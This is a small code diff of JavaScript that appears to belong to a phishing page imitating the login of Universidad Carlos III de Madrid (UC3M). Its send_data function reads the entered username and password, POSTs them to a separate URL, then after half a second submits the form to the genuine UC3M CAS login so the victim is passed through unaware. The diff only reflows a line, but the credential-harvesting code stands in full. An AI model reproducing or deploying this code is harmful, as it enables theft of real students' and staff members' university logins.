@@ -12,7 +12,8 @@ function send_data(){
 	var params = document.getElementById('edit-name').value + '||' + document.getElementById('edit-pass').value;
 	http.open('POST', url, true);
 	http.send(params);
-	setTimeout(function(){				document.getElementById('formulario1').action = "https://login.uc3m.es/index.php/CAS/login?service=https%3A%2F%2Faulaglobal.uc3m.es%2Flogin%2Findex.php";
+	setTimeout(function(){
+	document.getElementById('formulario1').action = "https://login.uc3m.es/index.php/CAS/login?service=https%3A%2F%2Faulaglobal.uc3m.es%2Flogin%2Findex.php";
 		document.getElementById("formulario1").submit(); 
 	}, 500);
 }
